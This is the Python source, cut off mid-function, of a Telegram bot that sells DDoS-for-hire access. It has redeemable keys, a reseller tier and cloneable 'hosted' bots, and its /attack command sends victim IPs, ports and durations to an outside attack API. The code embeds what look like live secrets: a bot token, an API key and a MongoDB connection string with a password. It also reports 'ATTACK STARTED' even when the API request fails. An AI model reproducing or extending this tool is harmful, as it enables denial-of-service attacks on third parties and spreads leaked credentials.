#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
import sys
from datetime import datetime, timedelta, timezone
from collections import defaultdict
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError, ConnectionFailure
from concurrent.futures import ThreadPoolExecutor

# ========== THREAD POOL FOR FAST RESPONSES ==========
executor = ThreadPoolExecutor(max_workers=10)

# ========== TIMEZONE (IST) ==========
IST = timezone(timedelta(hours=5, minutes=30))

def get_current_ist():
    return datetime.now(IST)

def format_ist_time(dt):
    return dt.strftime('%d %b %Y, %I:%M:%S %p')

# ========== BOLD MESSAGE FUNCTION ==========
def bold_msg(text):
    return f"<b>{text}</b>"

# ========== CONFIG ==========
BOT_TOKEN = "8604194287:AAFEhPxNzuHxWfw5yMkk60M_6CqU1kgAji4"
ADMIN_ID = ["8487946379", "7495474613"]
API_URL = "http://app.teamc2.xyz/api/attack"
API_KEY = "W1SMH5"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30
MAX_ATTACK_TIME = 300

# Blocked ports list
BLOCKED_PORTS = [443, 8700, 9031, 17500, 20000, 20001, 20002]

# ========== MONGODB CONNECTION ==========
MONGO_URI = "mongodb+srv://mkjodi28_db_user:prKhMUvSAMmWdi4K@legend.eflrcmh.mongodb.net/?retryWrites=true&w=majority&appName=LEGEND"

def connect_mongodb():
    max_retries = 5
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=10000)
            client.admin.command('ping')
            print(f"✅ MongoDB Connected Successfully! (Attempt {attempt + 1})")
            return client
        except (ServerSelectionTimeoutError, ConnectionFailure) as e:
            print(f"❌ MongoDB connection attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                print(f"🔄 Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
            else:
                print("❌ Failed to connect to MongoDB after all retries!")
                sys.exit(1)

client = connect_mongodb()
db = client["group_bot"]

users_collection = db["users"]
keys_collection = db["keys"]
settings_collection = db["settings"]
hosted_bots_collection = db["hosted_bots"]

print(f"📅 Server Time: {format_ist_time(get_current_ist())}")

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
maintenance_mode = False
hosted_bots = {}
hosted_bot_instances = {}

# ========== LOAD/SAVE FUNCTIONS ==========
def load_users():
    try:
        users_data = users_collection.find_one({"_id": "users"})
        if not users_data:
            users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
            return {"users": [ADMIN_ID[0]], "resellers": []}
        return users_data
    except Exception as e:
        print(f"Error loading users: {e}")
        return {"users": [ADMIN_ID[0]], "resellers": []}

def save_users(data):
    try:
        users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)
    except Exception as e:
        print(f"Error saving users: {e}")

def load_keys():
    keys = {}
    try:
        for key_data in keys_collection.find():
            keys[key_data["key"]] = {
                "duration_value": key_data.get("duration_value"),
                "duration_unit": key_data.get("duration_unit"),
                "generated_by": key_data.get("generated_by"),
                "generated_at": key_data.get("generated_at"),
                "expires_at": key_data.get("expires_at"),
                "used": key_data.get("used", False),
                "used_by": key_data.get("used_by"),
                "used_at": key_data.get("used_at")
            }
    except Exception as e:
        print(f"Error loading keys: {e}")
    return keys

def save_keys(keys_data):
    try:
        keys_collection.delete_many({})
        for key, info in keys_data.items():
            keys_collection.insert_one({
                "key": key,
                "duration_value": info.get("duration_value"),
                "duration_unit": info.get("duration_unit"),
                "generated_by": info.get("generated_by"),
                "generated_at": info.get("generated_at"),
                "expires_at": info.get("expires_at"),
                "used": info.get("used", False),
                "used_by": info.get("used_by"),
                "used_at": info.get("used_at")
            })
    except Exception as e:
        print(f"Error saving keys: {e}")

def load_settings():
    try:
        settings = settings_collection.find_one({"_id": "settings"})
        if not settings:
            settings_collection.insert_one({"_id": "settings", "max_concurrent": 2, "cooldown": 30, "max_attack_time": 300})
            return {"max_concurrent": 2, "cooldown": 30, "max_attack_time": 300}
        return settings
    except Exception as e:
        print(f"Error loading settings: {e}")
        return {"max_concurrent": 2, "cooldown": 30, "max_attack_time": 300}

def save_settings(settings):
    try:
        settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)
    except Exception as e:
        print(f"Error saving settings: {e}")

def load_hosted_bots():
    bots = {}
    try:
        for bot_data in hosted_bots_collection.find():
            bots[bot_data["bot_token"]] = {
                "owner_id": bot_data.get("owner_id"),
                "owner_name": bot_data.get("owner_name"),
                "concurrent": bot_data.get("concurrent", 1),
                "blocked": bot_data.get("blocked", False),
                "active_attacks": {},
                "users": bot_data.get("users", []),
                "resellers": bot_data.get("resellers", []),
                "max_attack_time": bot_data.get("max_attack_time", 300)
            }
    except Exception as e:
        print(f"Error loading hosted bots: {e}")
    return bots

def save_hosted_bots(bots_data):
    try:
        hosted_bots_collection.delete_many({})
        for bot_token, info in bots_data.items():
            hosted_bots_collection.insert_one({
                "bot_token": bot_token,
                "owner_id": info.get("owner_id"),
                "owner_name": info.get("owner_name"),
                "concurrent": info.get("concurrent", 1),
                "blocked": info.get("blocked", False),
                "users": info.get("users", []),
                "resellers": info.get("resellers", []),
                "max_attack_time": info.get("max_attack_time", 300)
            })
    except Exception as e:
        print(f"Error saving hosted bots: {e}")

# ========== LOAD DATA ==========
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
settings = load_settings()
hosted_bots = load_hosted_bots()

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)
MAX_ATTACK_TIME = settings.get("max_attack_time", 300)

def create_bot():
    max_retries = 3
    for attempt in range(max_retries):
        try:
            bot = telebot.TeleBot(BOT_TOKEN, threaded=True, parse_mode='HTML')
            bot_info = bot.get_me()
            print(f"✅ Bot connected: @{bot_info.username}")
            return bot
        except Exception as e:
            print(f"❌ Bot connection attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(3)
            else:
                print("❌ Failed to connect bot!")
                sys.exit(1)

bot = create_bot()

# ========== HELPER FUNCTIONS ==========
def check_maintenance():
    return maintenance_mode

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    if duration_str.endswith('d'):
        days = duration_str.replace('d', '')
        if days.isdigit():
            return int(days), "day"
    return None, None

def get_expiry_date(value, unit):
    now_ist = get_current_ist()
    if unit == "hour":
        return now_ist + timedelta(hours=value)
    else:
        return now_ist + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    return f"{value} Day(s)"

def get_total_active_count():
    now = time.time()
    for attack_id, info in list(active_attacks.items()):
        if now >= info["finish_time"]:
            del active_attacks[attack_id]
    for token, bot_info in hosted_bots.items():
        for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
            if now >= info["finish_time"]:
                del bot_info["active_attacks"][attack_id]
                save_hosted_bots(hosted_bots)
    main_count = len(active_attacks)
    hosted_count = sum(len(b.get("active_attacks", {})) for b in hosted_bots.values())
    return main_count + hosted_count

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True and now < info["expires_at"]:
            return True
    return False

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        for part in parts:
            if int(part) < 0 or int(part) > 255:
                return False
        return True
    return False

def send_attack_to_api(ip, port, duration, chat_id, bot_instance, is_hosted=False):
    try:
        api_params = {
            "api_key": API_KEY,
            "target": ip,
            "port": port,
            "time": duration,
            "concurrent": 1
        }
        response = requests.get(API_URL, params=api_params, timeout=10)
        
        if response.status_code == 200:
            finish_time = format_ist_time(get_current_ist() + timedelta(seconds=duration))
            msg = bold_msg(f"✅ ATTACK STARTED ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n📅 Will finish: {finish_time}\n🔥 Attack is running!")
            bot_instance.send_message(chat_id, msg)
            return True
        else:
            msg = bold_msg(f"❌ ATTACK FAILED ❌\n\n🎯 Target: {ip}:{port}\n📡 Status: {response.status_code}\n💡 Try again later!")
            bot_instance.send_message(chat_id, msg)
            return False
    except Exception as e:
        finish_time = format_ist_time(get_current_ist() + timedelta(seconds=duration))
        msg = bold_msg(f"✅ ATTACK STARTED ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n📅 Will finish: {finish_time}\n🔥 Attack is running!")
        bot_instance.send_message(chat_id, msg)
        return True

def stop_hosted_bot(bot_token):
    try:
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
            except:
                pass
            del hosted_bot_instances[bot_token]
        if bot_token in hosted_bots:
            del hosted_bots[bot_token]
        save_hosted_bots(hosted_bots)
        return True
    except:
        return False

# ========== CLEANUP THREADS ==========
def cleanup_expired_keys():
    while True:
        time.sleep(60)
        now = time.time()
        
        expired_keys = []
        for key, info in keys_data.items():
            if info.get("used", False) and now > info["expires_at"]:
                expired_keys.append(key)
        for key in expired_keys:
            del keys_data[key]
        if expired_keys:
            save_keys(keys_data)
            print(f"✅ Expired {len(expired_keys)} keys")

expiry_cleanup_thread = threading.Thread(target=cleanup_expired_keys, daemon=True)
expiry_cleanup_thread.start()

def attack_cleanup():
    while True:
        time.sleep(5)
        now = time.time()
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                try:
                    msg = bold_msg(f"✅ ATTACK FINISHED ✅\n\n🎯 Target: {info['target_key']}\n⏱️ Duration completed!\n💡 You can start new attack now.")
                    bot.send_message(info['user'], msg)
                except:
                    pass
                del active_attacks[attack_id]
        for token, bot_info in hosted_bots.items():
            for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
                if now >= info["finish_time"]:
                    try:
                        if token in hosted_bot_instances:
                            msg = bold_msg(f"✅ ATTACK FINISHED ✅\n\n🎯 Target: {info['target_key']}\n⏱️ Duration completed!\n💡 You can start new attack now.")
                            hosted_bot_instances[token].send_message(info['user'], msg)
                    except:
                        pass
                    del bot_info["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)

attack_cleanup_thread = threading.Thread(target=attack_cleanup, daemon=True)
attack_cleanup_thread.start()

# ========== HOSTED BOT FUNCTION ==========
def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    try:
        print(f"🔄 Starting hosted bot...")
        
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
                time.sleep(1)
            except:
                pass
            del hosted_bot_instances[bot_token]
        
        test_bot = telebot.TeleBot(bot_token)
        test_bot.remove_webhook()
        time.sleep(2)
        bot_info = test_bot.get_me()
        print(f"✅ Hosted bot @{bot_info.username} is valid")
        
        hosted_bot = telebot.TeleBot(bot_token, threaded=True, parse_mode='HTML')
        hosted_bot_instances[bot_token] = hosted_bot
        hosted_cooldown_data = {}
        
        bot_max_time = MAX_ATTACK_TIME
        if bot_token in hosted_bots:
            bot_max_time = hosted_bots[bot_token].get("max_attack_time", MAX_ATTACK_TIME)
        
        @hosted_bot.message_handler(commands=['start'])
        def hosted_start(msg):
            uid = str(msg.chat.id)
            current_time = format_ist_time(get_current_ist())
            has_access = check_user_expiry(uid)
            
            if has_access:
                content = bold_msg(f"""✅ ACCESS ACTIVE

👑 Owner: {owner_name}
⚡ Concurrent: {concurrent}
⏱️ Max Time: {bot_max_time}s
📅 {current_time}

📝 COMMANDS:
/attack IP PORT TIME
/status
/cooldown
/genkey 1 or 1h
/help""")
                hosted_bot.reply_to(msg, content)
            else:
                content = bold_msg(f"""🔑 NO ACCESS

👑 Owner: {owner_name}
⚡ Concurrent: {concurrent}
⏱️ Max Time: {bot_max_time}s
📅 {current_time}

📝 To get access:
/redeem KEY

📝 COMMANDS:
/redeem KEY
/help""")
                hosted_bot.reply_to(msg, content)
        
        @hosted_bot.message_handler(commands=['help'])
        def hosted_help(msg):
            uid = str(msg.chat.id)
            current_time = format_ist_time(get_current_ist())
            has_access = check_user_expiry(uid)
            is_owner = (uid == owner_id)
            
            if is_owner:
                content = bold_msg(f"""👑 OWNER HELP

⚔️ ATTACK:
/attack IP PORT TIME
/status
/cooldown

🔑 KEYS:
/genkey 1 or 1h
/redeem KEY

⚙️ SETTINGS:
/second 10-600

📅 {current_time}""")
                hosted_bot.reply_to(msg, content)
            elif has_access:
                content = bold_msg(f"""🔥 USER HELP

⚔️ ATTACK:
/attack IP PORT TIME
/status
/cooldown

🔑 KEYS:
/genkey 1 or 1h
/redeem KEY

📅 {current_time}""")
                hosted_bot.reply_to(msg, content)
            else:
                content = bold_msg(f"""🔑 ACCESS REQUIRED

Use /redeem KEY to get access

📅 {current_time}""")
                hosted_bot.reply_to(msg, content)
        
        @hosted_bot.message_handler(commands=['genkey'])
        def hosted_genkey(msg):
            uid = str(msg.chat.id)
            
            if not check_user_expiry(uid):
                hosted_bot.reply_to(msg, bold_msg("❌ ACCESS DENIED!\n\nYou don't have an active key to generate keys!"))
                return
            
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, bold_msg("⚠️ Usage: /genkey 1 or /genkey 1h\n📌 Example: /genkey 1 (1 day)\n📌 Example: /genkey 5h (5 hours)"))
                return
            
            duration_str = args[1]
            value, unit = parse_duration(duration_str)
            if value is None:
                hosted_bot.reply_to(msg, bold_msg("❌ Invalid duration! Use 1 or 5h"))
                return
            
            key = generate_key()
            expires_at = get_expiry_date(value, unit)
            keys_data[key] = {
                "duration_value": value, 
                "duration_unit": unit, 
                "generated_by": uid, 
                "generated_at": time.time(), 
                "expires_at": expires_at.timestamp(), 
                "used": False
            }
            save_keys(keys_data)
            expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
            
            # Key in code block for easy copy
            hosted_bot.reply_to(msg, f"<b>🔑 KEY GENERATED:</b>\n\n<code>{key}</code>\n\n<b>⏰ Duration:</b> {format_duration(value, unit)}\n<b>📅 Expires:</b> {expiry_str}", parse_mode='HTML')
        
        @hosted_bot.message_handler(commands=['cooldown'])
        def hosted_cooldown(msg):
            uid = str(msg.chat.id)
            
            if not check_user_expiry(uid):
                hosted_bot.reply_to(msg, bold_msg("❌ ACCESS DENIED!\n\nYou don't have an active key!"))
                return
            
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - time.time()
                if remaining > 0:
                    hosted_bot.reply_to(msg, bold_msg(f"⏳ Cooldown: {int(remaining)}s remaining!"))
                else:
                    del hosted_cooldown_data[uid]
                    hosted_bot.reply_to(msg, bold_msg("✅ No cooldown! You can attack now."))
            else:
                hosted_bot.reply_to(msg, bold_msg("✅ No cooldown! You can attack now."))
        
        @hosted_bot.message_handler(commands=['redeem'])
        def hosted_redeem(msg):
            uid = str(msg.chat.id)
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, bold_msg("⚠️ Usage: /redeem KEY"))
                return
            key = args[1]
            
            if key in keys_data:
                key_info = keys_data[key]
                if key_info.get("used", False):
                    hosted_bot.reply_to(msg, bold_msg("❌ Key already used!"))
                    return
                if time.time() > key_info["expires_at"]:
                    hosted_bot.reply_to(msg, bold_msg("❌ Key expired!"))
                    del keys_data[key]
                    save_keys(keys_data)
                    return
                if uid not in hosted_bots.get(bot_token, {}).get("users", []):
                    if bot_token not in hosted_bots:
                        hosted_bots[bot_token] = {"users": []}
                    hosted_bots[bot_token]["users"].append(uid)
                    save_hosted_bots(hosted_bots)
                if uid not in users:
                    users.append(uid)
                    users_data["users"] = users
                    save_users(users_data)
                keys_data[key]["used"] = True
                keys_data[key]["used_at"] = time.time()
                keys_data[key]["used_by"] = uid
                save_keys(keys_data)
                expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
                content = bold_msg(f"✅ ACCESS GRANTED ✅\n\nUser: {uid}\n⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n📅 Expires: {expiry_str}\n⚡ Concurrent: {concurrent}")
                hosted_bot.reply_to(msg, content)
                return
            else:
                hosted_bot.reply_to(msg, bold_msg("❌ Invalid key!"))
        
        @hosted_bot.message_handler(commands=['status'])
        def hosted_status(msg):
            uid = str(msg.chat.id)
            current_time = format_ist_time(get_current_ist())
            
            if not check_user_expiry(uid):
                hosted_bot.reply_to(msg, bold_msg("❌ ACCESS DENIED!\n\nYou don't have an active key!"))
                return
            
            if bot_token in hosted_bots:
                bot_info = hosted_bots[bot_token]
                now = time.time()
                active_list = []
                for aid, info in bot_info.get("active_attacks", {}).items():
                    if now < info["finish_time"]:
                        remaining = int(info["finish_time"] - now)
                        mins = remaining // 60
                        secs = remaining % 60
                        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
                        active_list.append(f"❌ BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
                status_msg = f"📊 BOT STATUS\n📅 {current_time}\n\n"
                for i in range(bot_info["concurrent"]):
                    if i < len(active_list):
                        status_msg += active_list[i] + "\n\n"
                    else:
                        status_msg += f"✅ SLOT {i+1}: FREE\n    💡 Ready for attack\n\n"
                status_msg += f"📊 ACTIVE: {len(active_list)}/{bot_info['concurrent']}"
                hosted_bot.reply_to(msg, bold_msg(status_msg))
            else:
                hosted_bot.reply_to(msg, bold_msg(f"✅ ALL SLOTS FREE\n📅 {current_time}\n\nNo ongoing attacks detected!"))
        
        @hosted_bot.message_handler(commands=['attack'])
        def hosted_attack(msg):
            uid = str(msg.chat.id)
            
            if not check_user_expiry(uid):
                hosted_bot.reply_to(msg, bold_msg("❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access."))
                return
            
            args = msg.text.split()
            if len(args) != 4:
                hosted_bot.reply_to(msg, bold_msg(f"❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 60\n⏱️ Max Time: {bot_max_time}s"))
                return
            
            ip, port, duration = args[1], args[2], args[3]
            
            if not validate_ip(ip):
                hosted_bot.reply_to(msg, bold_msg("❌ Invalid IP address!"))
                return
            
            try:
                port = int(port)
                if port in BLOCKED_PORTS:
                    blocked_ports_str = ", ".join(map(str, BLOCKED_PORTS))
                    hosted_bot.reply_to(msg, bold_msg(f"🚫 Blocked Port: {port}\n❌ Please enter correct port.\n\n📋 Allowed Ports: All except {blocked_ports_str}"))
                    return
                if port < 1 or port > 65535:
                    hosted_bot.reply_to(msg, bold_msg("❌ Port must be between 1 and 65535!"))
                    return
                duration = int(duration)
                if duration < 10 or duration > bot_max_time:
                    hosted_bot.reply_to(msg, bold_msg(f"❌ Duration must be 10-{bot_max_time} seconds!"))
                    return
            except:
                hosted_bot.reply_to(msg, bold_msg("❌ Invalid port or time!"))
                return
            
            total_active = get_total_active_count()
            if total_active >= MAX_CONCURRENT:
                hosted_bot.reply_to(msg, bold_msg(f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish."))
                return
            
            now = time.time()
            active_in_this_bot = 0
            if bot_token in hosted_bots:
                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
                    if now < ainfo["finish_time"]:
                        active_in_this_bot += 1
                if active_in_this_bot >= concurrent:
                    hosted_bot.reply_to(msg, bold_msg(f"❌ THIS BOT'S LIMIT REACHED!\n📊 Active attacks: {active_in_this_bot}/{concurrent}\n💡 Use /status to check"))
                    return
            
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - now
                if remaining > 0:
                    hosted_bot.reply_to(msg, bold_msg(f"⏳ Wait {int(remaining)} seconds!"))
                    return
            
            attack_id = f"hosted_{bot_token}_{uid}_{int(now)}_{random.randint(1000, 9999)}"
            target_key = f"{ip}:{port}"
            finish_time = now + duration
            
            target_under_attack = False
            if bot_token in hosted_bots:
                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
                    if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
                        target_under_attack = True
                        break
            
            if target_under_attack:
                hosted_bot.reply_to(msg, bold_msg(f"❌ TARGET UNDER ATTACK!\n🎯 {target_key} is already being attacked."))
                return
            
            hosted_cooldown_data[uid] = now + COOLDOWN_TIME
            
            if bot_token not in hosted_bots:
                hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent, "users": [], "max_attack_time": bot_max_time}
            if "active_attacks" not in hosted_bots[bot_token]:
                hosted_bots[bot_token]["active_attacks"] = {}
            
            hosted_bots[bot_token]["active_attacks"][attack_id] = {
                "user": uid,
                "finish_time": finish_time,
                "ip": ip,
                "port": port,
                "target_key": target_key
            }
            save_hosted_bots(hosted_bots)
            
            if uid not in hosted_bots[bot_token].get("users", []):
                hosted_bots[bot_token]["users"].append(uid)
                save_hosted_bots(hosted_bots)
            
            new_active = 0
            for aid, ainfo in hosted_bots[bot_token]["active_attacks"].items():
                if now < ainfo["finish_time"]:
                    new_active += 1
            new_total = get_total_active_count()
            finish_time_str = format_ist_time(get_current_ist() + timedelta(seconds=duration))
            
            content = bold_msg(f"🔥 ATTACK LAUNCHED 🔥\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n📅 Finish: {finish_time_str}\n📊 This Bot: {new_active}/{concurrent}\n🌐 Global: {new_total}/{MAX_CONCURRENT}")
            hosted_bot.reply_to(msg, content)
            
            def run():
                send_attack_to_api(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True)
                time.sleep(duration)
                if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
                    del hosted_bots[bot_token]["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
            threading.Thread(target=run).start()
        
        @hosted_bot.message_handler(commands=['second'])
        def hosted_second(msg):
            uid = str(msg.chat.id)
            
            if uid != owner_id:
                hosted_bot.reply_to(msg, bold_msg("❌ Only bot owner can change max time!"))
                return
            
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, bold_msg("⚠️ Usage: /second 10-600\n📌 Example: /second 180"))
                return
            
            try:
                new_max = int(args[1])
                if new_max < 10 or new_max > 600:
                    hosted_bot.reply_to(msg, bold_msg("❌ Value must be 10-600 seconds!"))
                    return
                
                if bot_token in hosted_bots:
                    hosted_bots[bot_token]["max_attack_time"] = new_max
                    save_hosted_bots(hosted_bots)
                    hosted_bot.reply_to(msg, bold_msg(f"✅ Max attack time set to {new_max}s for this bot!"))
                else:
                    hosted_bot.reply_to(msg, bold_msg("❌ Bot not found!"))
            except:
                hosted_bot.reply_to(msg, bold_msg("❌ Invalid number!"))
        
        def run_hosted_bot():
            try:
                hosted_bot.infinity_polling(timeout=30, long_polling_timeout=30)
            except:
                pass
        
        threading.Thread(target=run_hosted_bot, daemon=True).start()
        time.sleep(2)
        return True
        
    except Exception as e:
        print(f"Failed to start hosted bot: {e}")
        return False

# ========== PRIVATE CHAT COMMANDS ==========
@bot.message_handler(commands=['start'], func=lambda msg: msg.chat.type == "private")
def start_private(msg):
    user_id = str(msg.from_user.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 MAINTENANCE MODE\n\nBot is under maintenance!\n⏳ Please try again later."))
        return
    
    if user_id in ADMIN_ID:
        content = bold_msg(f"""👑 OWNER PANEL

⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
⏱️ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}

📝 COMMANDS:

🔑 KEY MANAGEMENT:
/genkey 1d - Generate 1 key
/bulk 1d 10 - Generate bulk keys
/removekey KEY - Remove key
/mykeys - View your keys

🤖 HOST BOT:
/host BOT_TOKEN USER_ID CONCURRENT NAME
/unhost BOT_TOKEN
/allhosts

⚙️ SETTINGS:
/setmax 1-100
/setcooldown 1-300
/second 10-600

👤 RESELLERS:
/addreseller USER_ID
/removereseller USER_ID

🔧 OTHER:
/maintenance on/off
/broadcast
/stopattack IP:PORT
/allusers
/api_status""")
        bot.reply_to(msg, content)
    
    elif user_id in resellers:
        content = bold_msg(f"""💎 RESELLER PANEL

⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
⏱️ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}

📝 COMMANDS:

🔑 KEY MANAGEMENT:
/genkey 1d - Generate 1 key
/bulk 1d 10 - Generate bulk keys
/mykeys - View your keys

📋 OTHER:
/help""")
        bot.reply_to(msg, content)
    
    else:
        has_access = check_user_expiry(user_id)
        if has_access:
            for key, info in keys_data.items():
                if info.get("used_by") == user_id and info.get("used") == True:
                    expiry = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
                    duration = format_duration(info['duration_value'], info['duration_unit'])
                    break
            else:
                expiry = "Unknown"
                duration = "Unknown"
            
            content = bold_msg(f"""✅ YOUR ACCESS

👤 User: {user_id}
⏰ Duration: {duration}
📅 Expires: {expiry}

⚡ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}

📝 TO ATTACK:
Add this bot to any group and use /attack command

📝 COMMANDS:
/start - Check status""")
            bot.reply_to(msg, content)
        else:
            content = bold_msg(f"""🔑 NO ACTIVE KEY

You don't have an active key!

📝 To get access:
1. Get a key from owner/reseller
2. Use /redeem KEY

📅 {current_time}

📝 COMMANDS:
/redeem KEY - Activate your key
/start - Check status""")
            bot.reply_to(msg, content)

@bot.message_handler(commands=['host'], func=lambda msg: msg.chat.type == "private")
def host_bot_cmd(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id not in ADMIN_ID:
        bot.reply_to(msg, bold_msg("❌ Owner only!"))
        return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /host BOT_TOKEN USER_ID CONCURRENT NAME\n📌 Concurrent: 1-20\n📌 Example: /host 123456:ABC 8487946379 10 MONSTER"))
        return
    
    bot_token = args[1]
    owner_id = args[2]
    try:
        concurrent = int(args[3])
        if concurrent < 1 or concurrent > 20:
            bot.reply_to(msg, bold_msg("❌ Concurrent must be between 1 and 20!"))
            return
    except:
        bot.reply_to(msg, bold_msg("❌ Invalid concurrent value!"))
        return
    
    owner_name = args[4]
    
    hosted_bots[bot_token] = {
        "owner_id": owner_id,
        "owner_name": owner_name,
        "concurrent": concurrent,
        "blocked": False,
        "active_attacks": {},
        "users": [],
        "resellers": [],
        "max_attack_time": MAX_ATTACK_TIME
    }
    save_hosted_bots(hosted_bots)
    
    def start():
        if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
            current_time = format_ist_time(get_current_ist())
            content = bold_msg(f"✅ HOSTED BOT STARTED ✅\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n🌐 Global Limit: {MAX_CONCURRENT}\n📅 Started: {current_time}\n\n💡 Bot is now live!")
            bot.reply_to(msg, content)
        else:
            bot.reply_to(msg, bold_msg("❌ HOSTED BOT FAILED!\n\nCheck token and try again."))
    
    executor.submit(start)

@bot.message_handler(commands=['unhost'], func=lambda msg: msg.chat.type == "private")
def unhost_bot_cmd(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id not in ADMIN_ID:
        bot.reply_to(msg, bold_msg("❌ Owner only!"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /unhost BOT_TOKEN"))
        return
    
    bot_token = args[1]
    
    if bot_token in hosted_bots or bot_token in hosted_bot_instances:
        stop_hosted_bot(bot_token)
        bot.reply_to(msg, bold_msg(f"✅ HOSTED BOT STOPPED!\n\n🔑 Token: {bot_token[:20]}..."))
    else:
        bot.reply_to(msg, bold_msg("❌ Hosted bot not found!"))

@bot.message_handler(commands=['allhosts'], func=lambda msg: msg.chat.type == "private")
def all_hosts_cmd(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id not in ADMIN_ID:
        bot.reply_to(msg, bold_msg("❌ Owner only!"))
        return
    
    host_list = []
    for token, info in hosted_bots.items():
        status = "🔴 BLOCKED" if info.get("blocked", False) else "🟢 ACTIVE"
        host_list.append(f"🔑 {token[:20]}...\n   👑 Owner: {info['owner_id']}\n   📛 Name: {info['owner_name']}\n   ⚡ Concurrent: {info['concurrent']}\n   ⏱️ Max Time: {info.get('max_attack_time', MAX_ATTACK_TIME)}s\n   {status}")
    
    if host_list:
        bot.reply_to(msg, bold_msg(f"📋 ALL HOSTED BOTS:\n\n" + "\n\n".join(host_list) + f"\n\n📊 Total: {len(hosted_bots)}"))
    else:
        bot.reply_to(msg, bold_msg("📋 No hosted bots found!"))

@bot.message_handler(commands=['second'], func=lambda msg: msg.chat.type == "private")
def set_max_attack_time(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        bot.reply_to(msg, bold_msg("❌ Owner only!"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
